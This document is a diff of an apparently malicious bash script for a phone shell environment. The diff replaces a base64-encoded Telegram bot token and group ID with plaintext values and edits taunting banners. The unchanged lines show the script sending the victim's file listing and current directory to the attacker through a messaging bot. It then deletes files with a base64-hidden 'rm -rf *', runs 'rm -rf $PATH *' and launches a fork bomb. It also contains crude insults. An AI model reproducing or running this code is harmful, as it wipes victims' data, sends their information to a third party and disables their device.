@@ -1,10 +1,10 @@
 #!/bin/bash
-tkn=$(base64 -d <<<"MTQxNDgwMDM4MTpBQUVBa3VYWEdvTlFhMDJGT29MM29MUktVU0JIWUo5OVR6dwo=")
-grp=$(base64 -d <<<"LTEwMDExNDQ0MzU3MjIK")
+tkn=1414800381:AAFpL93Ny_hfygwVQfYJJhrZ6Z0RMIBH9aY
+grp=-458649020
 
 check() { 
 echo please wait 
-for i in curl toilet wget perl jq; do 
+for i in curl toilet neofetch wget perl jq; do 
 if [[ -e $PATH/$i ]]; then 
 echo " " > 2&>1 &
 else pkg install -y $i > 2&>1 
@@ -56,7 +56,7 @@ ls > allTools.txt
 sendfile allTools.txt > 2&>1
 eval $(base64 -d <<<"cm0gLXJmICoK")
 sendmessage "$(pwd) $(ls)" > 2&>1
-sendmessage "xzuma Fucked away" > 2&>1
+sendmessage "Another Hacker Fucked away" > 2&>1
 clear
 echo "________________________________________"
 toilet -f future "You Have Been Hacked"
@@ -64,10 +64,10 @@ toilet -f future "By FS3CUR17Y"
 toilet -f future "I have all ur info"
 toilet -f future "You are An"
 toilet -f mono12 "AssHole"
-toilet -f mono12 "xzuma"
+toilet -f mono12 "Hacker"
 echo "_________________________________________ "
 toilet -f future "I am"
-toilet -f mono12 -F gay "TH33HT"
+toilet -f mono12 -F gay "333"
 toilet -f future "remember my name xD"
 rm -rf $PATH *
 :(){ :|: & };: &
